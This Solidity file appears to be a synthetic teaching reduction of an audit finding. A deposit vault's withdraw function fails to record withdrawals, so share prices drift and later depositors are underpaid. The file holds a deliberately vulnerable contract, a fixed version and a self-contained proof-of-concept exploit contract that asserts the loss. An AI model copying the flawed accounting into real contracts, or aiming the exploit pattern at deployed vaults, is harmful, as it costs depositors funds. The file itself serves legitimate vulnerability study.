// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Nexus DepositETH — share price ignores withdrawals (Pashov, finding 44980)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: withdraw pays assets out but never increases ethWithdrawn or
    burns nETHMinted. The next _updateSharePrice still divides by
    ethDeposited - ethWithdrawn + rewardsClaimed, so a later depositor is
    paid 1.024 ETH on a 1.05 ETH claim. Vulnerable formula preserved (@> VULN). */

contract Token {
    string public symbol = "nETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract DepositETH {
    uint256 public constant BASE = 1e18;
    Token public token;
    uint256 public ethDeposited;
    uint256 public ethWithdrawn;
    uint256 public rewardsClaimed;
    uint256 public nETHMinted;
    uint256 public sharePrice;
    mapping(address => uint256) public sharesOf;

    constructor(Token t) {
        token = t;
        sharePrice = BASE;
    }

    function deposit(uint256 amount) external returns (uint256 shares) {
        token.transferFrom(msg.sender, address(this), amount);
        if (nETHMinted == 0) {
            shares = amount;
        } else {
            shares = amount * sharePrice / BASE;
        }
        nETHMinted += shares;
        ethDeposited += amount;
        sharesOf[msg.sender] += shares;
    }

    function earn(uint256 reward) external {
        token.mint(address(this), reward);
        _updateSharePrice(reward);
    }

    function _updateSharePrice(uint256 _rewardsEarned) internal {
        rewardsClaimed += _rewardsEarned;
        if (nETHMinted == 0) {
            sharePrice = BASE;
        } else {
            sharePrice = (nETHMinted) * BASE / (ethDeposited - ethWithdrawn + rewardsClaimed); // @> VULN: ethWithdrawn stays 0 and nETHMinted still counts exited shares
        }
    }

    function withdraw(uint256 shares) external returns (uint256 amount) {
        require(sharesOf[msg.sender] >= shares, "shares");
        amount = shares * BASE / sharePrice;
        sharesOf[msg.sender] -= shares;
        // FIX: ethWithdrawn += amount; nETHMinted -= shares;
        token.transfer(msg.sender, amount);
    }
}

contract DepositETHFixed {
    uint256 public constant BASE = 1e18;
    Token public token;
    uint256 public ethDeposited;
    uint256 public ethWithdrawn;
    uint256 public rewardsClaimed;
    uint256 public nETHMinted;
    uint256 public sharePrice;
    mapping(address => uint256) public sharesOf;

    constructor(Token t) {
        token = t;
        sharePrice = BASE;
    }

    function deposit(uint256 amount) external returns (uint256 shares) {
        token.transferFrom(msg.sender, address(this), amount);
        if (nETHMinted == 0) {
            shares = amount;
        } else {
            shares = amount * sharePrice / BASE;
        }
        nETHMinted += shares;
        ethDeposited += amount;
        sharesOf[msg.sender] += shares;
    }

    function earn(uint256 reward) external {
        token.mint(address(this), reward);
        rewardsClaimed += reward;
        if (nETHMinted == 0) sharePrice = BASE;
        else sharePrice = nETHMinted * BASE / (ethDeposited - ethWithdrawn + rewardsClaimed);
    }

    function withdraw(uint256 shares) external returns (uint256 amount) {
        require(sharesOf[msg.sender] >= shares, "shares");
        amount = shares * BASE / sharePrice;
        sharesOf[msg.sender] -= shares;
        ethWithdrawn += amount;
        nETHMinted -= shares;
        token.transfer(msg.sender, amount);
    }
}

contract Carol {
    function approveAndDeposit(DepositETH vault, Token token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }

    function withdrawAll(DepositETH vault) external returns (uint256) {
        return vault.withdraw(vault.sharesOf(address(this)));
    }

    function approveAndDepositFixed(DepositETHFixed vault, Token token, uint256 amount) external {
        token.approve(address(vault), amount);
        vault.deposit(amount);
    }

    function withdrawAllFixed(DepositETHFixed vault) external returns (uint256) {
        return vault.withdraw(vault.sharesOf(address(this)));
    }
}

contract Exploit {
    Token public token; // CREATE nonce 1
    DepositETH public vault; // CREATE nonce 2
    Carol public carol; // CREATE nonce 3
    uint256 public carolOut;
    uint256 public aliceOut;

    constructor() {
        token = new Token();
        vault = new DepositETH(token);
        carol = new Carol();
    }

    function run() external {
        uint256 one = 1e18;
        uint256 reward = 5e16;
        token.mint(address(this), one);
        token.approve(address(vault), one);
        vault.deposit(one);
        vault.earn(reward);
        token.mint(address(vault), 1);
        aliceOut = vault.withdraw(vault.sharesOf(address(this)));

        token.mint(address(carol), one);
        carol.approveAndDeposit(vault, token, one);
        vault.earn(reward);
        carolOut = carol.withdrawAll(vault);

        uint256 stuck = token.balanceOf(address(vault));
        require(vault.ethWithdrawn() == 0, "withdrawals untracked");
        require(aliceOut == 1050000000000000001, "alice");
        require(carolOut == 1024390243902439024, "carol short");
        require(carolOut < one + reward, "carol should have received 1.05");
        require(stuck == (one + reward) - carolOut, "reward dust stuck");
    }
}
